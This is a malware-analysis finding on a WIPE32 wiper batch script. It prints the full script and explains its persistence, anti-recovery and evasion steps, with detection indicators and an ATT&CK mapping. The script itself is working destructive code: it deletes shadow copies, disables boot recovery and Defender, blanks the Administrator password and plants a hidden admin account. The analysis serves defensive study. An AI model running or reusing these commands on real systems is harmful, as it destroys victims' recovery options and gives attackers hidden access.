# Finding 12: WIPE32 Wiper - Batch Script Persistence and Anti-Reboot

## Metadata
- **Repository**: theZoo-master
- **File Path**: `malware/Binaries/Wiper.WIPE32.P/Wiper.WIPE32.P/3b67debe898a0ad7a766ff729d89e57cff846aa0429a1a9431ad557bb3812b36`
- **Language**: Windows Batch Script
- **Malware Family**: WIPE32 Wiper (Destructive Malware)

## Code Snippet

```batch
@echo off
:: Get the path to the current batch file
set "batchFilePath=%~f0"

:: Copy the batch file to the Startup folder
xcopy "%batchFilePath%" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" /Y

:: Define the name of the scheduled task
set taskName=My

:: Get the full path of the current batch file
set "batchFilePath=%~f0"

:: *** SCHEDULED TASK CREATION - LINE 15 ***
:: Create a scheduled task that runs the batch file at startup with highest privileges (admin)
schtasks /create /tn "%taskName%" /tr "%batchFilePath%" /sc onlogon /rl highest /f

:: *** ANTI-REBOOT REGISTRY MODIFICATIONS - Lines 18-22 ***
:: Set registry key to disable automatic restart
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v "AutoReboot" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoRebootWithLoggedOnUsers /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" /v MaintenanceDisabled /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Windows" /v NoAutoRebootWithLoggedOnUsers /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AlwaysAutoRebootAtScheduledTime /t REG_DWORD /d 0 /f

:: Stop Windows Update service
net stop "Windows Update"

:: Cancel any pending shutdown
shutdown /a

:: *** DISABLE AUTOMATIC REPAIR - LINE 28 ***
:: disable automatic repair on startup
bcdedit /set {default} recoveryenabled No

:: disable after two failed boots
bcdedit /set {default} bootstatuspolicy ignoreallfailures

:: Disable Windows Error Recovery on startup
bcdedit /set {current} bootstatuspolicy ignoreallfailures
bcdedit /set {current} recoveryenabled no

:: Set the boot status policy for the current boot configuration
bcdedit /set bootstatuspolicy ignoreallfailures

:: Delete Volume Shadow Copies (backups)
vssadmin delete shadows /all /quiet

:: Enable administrator account (if disabled)
net user administrator /active:yes

:: Change administrator password to blank
net user administrator ""

:: Add new user with admin privileges
net user WinUpdate password123 /add
net localgroup administrators WinUpdate /add

:: Hide the newly created user from login screen
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v WinUpdate /t REG_DWORD /d 0 /f

:: Disable Windows Defender
powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

:: Delete system restore points
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

:: Continue with destructive actions
:: [Wiper payload execution would follow]
```

## Analysis

**What it does:**
This is a highly sophisticated wiper/destructive malware batch script that establishes persistence, disables system recovery mechanisms, prevents automatic reboots, creates backdoor accounts, and prepares the system for destructive actions. It's designed to ensure the wiper can complete its mission without interference from Windows recovery systems.

**How it uses Windows Scheduled Tasks (T1053.005):**
- **Task name**: `/tn "My"` - extremely generic, non-suspicious name
- **Target**: `/tr "%batchFilePath%"` - points to itself (the batch script)
- **Schedule**: `/sc onlogon` - runs at every user logon
- **Privilege**: `/rl highest` - runs with highest available privileges
- **Force**: `/f` - overwrites any existing task with same name

**Multi-Layered Persistence:**
1. **Scheduled Task**: Runs at logon with highest privileges
2. **Startup Folder**: Copies itself to user startup folder
3. **Backdoor Account**: Creates hidden admin account "WinUpdate"

**Anti-Recovery Techniques:**

**1. Disable Automatic Reboot (Lines 18-22):**
```batch
- CrashControl\AutoReboot = 0           → Prevents reboot after crash
- NoAutoRebootWithLoggedOnUsers = 1     → Prevents Windows Update reboots
- MaintenanceDisabled = 1               → Disables maintenance tasks
- AlwaysAutoRebootAtScheduledTime = 0   → Prevents scheduled reboots
```

**2. Disable Boot Recovery (Lines 28-36):**
```batch
- bcdedit /set recoveryenabled No              → Disables recovery partition
- bcdedit /set bootstatuspolicy ignoreallfailures → Ignores boot failures
```
This prevents Windows from entering recovery mode after destructive actions.

**3. Destroy Shadow Copies (Multiple lines):**
```batch
- vssadmin delete shadows /all /quiet    → Deletes Volume Shadow Copies
- wmic shadowcopy delete                 → Alternative shadow copy deletion
```
Eliminates system restore points and backups.

**4. Stop Protection Services:**
```batch
- net stop "Windows Update"                          → Stops update service
- shutdown /a                                        → Cancels pending shutdown
- Set-MpPreference -DisableRealtimeMonitoring $true → Disables Defender
```

**Backdoor Account Creation:**
```batch
net user WinUpdate password123 /add                  → Creates new user
net localgroup administrators WinUpdate /add         → Grants admin rights
reg add [UserList] /v WinUpdate /t REG_DWORD /d 0 /f → Hides from login screen
```

**Evasion/Stealth Techniques:**
1. **Generic task name**: "My" is extremely common and non-suspicious
2. **Hidden user account**: Registry modification hides "WinUpdate" from login screen
3. **Mimics Windows Update**: Username "WinUpdate" appears legitimate
4. **Multiple persistence**: Ensures survival even if one method is removed
5. **Silent execution**: Uses `/quiet` flags on destructive commands
6. **Disables detection**: Turns off Windows Defender real-time monitoring

**Attack Phases:**

**Phase 1 - Persistence:**
- Create scheduled task (onlogon + highest privileges)
- Copy to Startup folder
- Create hidden backdoor account

**Phase 2 - Disable Recovery:**
- Disable automatic reboots
- Disable boot recovery options
- Stop Windows Update service
- Cancel pending shutdowns

**Phase 3 - Eliminate Backups:**
- Delete Volume Shadow Copies (system restore points)
- Destroy shadow copies via WMIC

**Phase 4 - Disable Protection:**
- Disable Windows Defender
- Enable and compromise Administrator account

**Phase 5 - Destructive Payload:**
(Script would continue with wiper operations)

**Why This is Dangerous:**
1. **Prevents recovery**: System cannot boot into recovery mode
2. **Eliminates backups**: Shadow copies deleted, no rollback possible
3. **Stops updates**: Windows Update service disabled
4. **Disables AV**: Defender real-time protection turned off
5. **Persistent backdoor**: Hidden admin account for re-entry
6. **Anti-forensics**: Many actions designed to complicate investigation

**Real-World Wiper Similarities:**
This script combines techniques seen in:
- **NotPetya**: Credential stealing, spreading, MBR corruption
- **Shamoon**: Scheduled execution, shadow copy deletion, disk wiping
- **HermeticWiper**: Driver-based disk corruption, VSS deletion
- **WhisperGate**: MBR overwrite, file corruption

**Detection Indicators:**
- Task named "My" with onlogon trigger and highest privilege
- Registry modifications to CrashControl, WindowsUpdate, Maintenance
- `bcdedit` commands disabling recovery
- Shadow copy deletion commands
- New user "WinUpdate" creation
- Windows Defender disabled via PowerShell
- Windows Update service stopped

**MITRE ATT&CK Mapping:**
- **T1053.005**: Scheduled Task/Job: Scheduled Task (Primary persistence)
- **T1547.001**: Boot or Logon Autostart Execution: Registry Run Keys (Startup folder)
- **T1136.001**: Create Account: Local Account (backdoor user)
- **T1098**: Account Manipulation (administrator password change)
- **T1112**: Modify Registry (multiple anti-recovery settings)
- **T1490**: Inhibit System Recovery (bcdedit, shadow copies)
- **T1489**: Service Stop (Windows Update)
- **T1562.001**: Impair Defenses: Disable or Modify Tools (Defender)
- **T1070.004**: Indicator Removal on Host: File Deletion (shadow copies)
- **T1485**: Data Destruction (wiper primary goal)
- **T1561**: Disk Wipe
- **T1529**: System Shutdown/Reboot (prevention)
- **T1036.005**: Masquerading: Match Legitimate Name or Location (WinUpdate)
